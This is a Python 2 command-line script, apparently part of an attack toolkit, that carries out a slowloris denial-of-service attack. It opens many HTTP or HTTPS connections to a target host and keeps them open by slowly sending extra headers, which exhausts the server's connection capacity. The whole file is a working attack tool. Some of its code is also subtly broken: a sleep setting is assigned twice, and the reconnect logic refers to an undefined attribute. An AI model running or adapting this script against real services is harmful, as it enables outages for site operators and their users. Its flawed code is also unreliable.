#!/usr/bin/python2
'''
Perform slowloris attack against a HTTP service.

slowloris.py [-p HEADER] [-m METHOD] [-H HEADER] URL
'''
import os
import time
import socket
from base64 import b64encode

from lib.http import HTTPClient
from lib.attack import Attack, AttackOption
from lib.commandline import main
from lib.utils import ConnectionList


class SlowHTTPClient(HTTPClient):
    '''
    A HTTP client that doest no send double CRLF on request.
    '''
    def __init__(self, pool_header, url):
        HTTPClient.__init__(self)

        self.url = url
        self.connections = ConnectionList()
        self.pool_header = pool_header

    def request(self, method, path):
        try:
            self.connections.append(HTTPClient.request(
                self, method, self.url + path
            ))
        except socket.error:
            pass

    def pool(self):
        header, value = self.pool_header

        for sck in self.connections:
            try:
                sck.send_header(header, value)
            except socket.error:
                self.connections.replace(sck, self.request(self.method, '?'))


class Slowloris(Attack):
    '''
    Perform a slowloris DoS attack.
    '''
    options = [
        AttackOption(
            'port',
            AttackOption.REQUIRED_ARGUMENT,
            default=80,
            parser=int
        ),
        AttackOption(
            'poolheader',
            AttackOption.REQUIRED_ARGUMENT,
            default=('X-A', 1000),
            parser=lambda x: x.split(': ')
        ),
        AttackOption(
            'header',
            AttackOption.REQUIRED_ARGUMENT,
            parser=lambda x: x.split(': ')
        ),
        AttackOption(
            'method',
            AttackOption.REQUIRED_ARGUMENT,
            default='head'
        ),
        AttackOption(
            'sleep',
            AttackOption.REQUIRED_ARGUMENT,
            default=5,
            parser=int
        ),
        AttackOption(
            'count',
            AttackOption.REQUIRED_ARGUMENT,
            default=1000,
            parser=int
        ),
        AttackOption(
            'ssl',
            AttackOption.NO_ARGUMENT
        )
    ]

    def __init__(self, host, *args, **kwargs):
        url = '{scheme}://{host}:{port}'.format(
            scheme='https' if kwargs['ssl'] else 'http',
            host=host,
            port=kwargs['port']
        )

        self.client = SlowHTTPClient(
            kwargs['poolheader'], url
        )

        self.sleep = kwargs['count']
        self.method = kwargs['method']
        self.sleep = kwargs['sleep']
        self.count = kwargs['count']

        for key, value in kwargs.get('header', []):
            self.client.add_default_header(key, value)

    def loop(self):
        self.client.pool()
        time.sleep(self.sleep)

    def build_connections(self):
        for _ in range(self.count):
            qs = b64encode(os.urandom(6))
            self.client.request(self.method, '/?{0}'.format(qs))

    def attack(self):
        print 'Creating connections...'
        self.build_connections()

        while True:
            print 'Pooling connections...'
            self.loop()


if __name__ == '__main__':
    main(Slowloris)
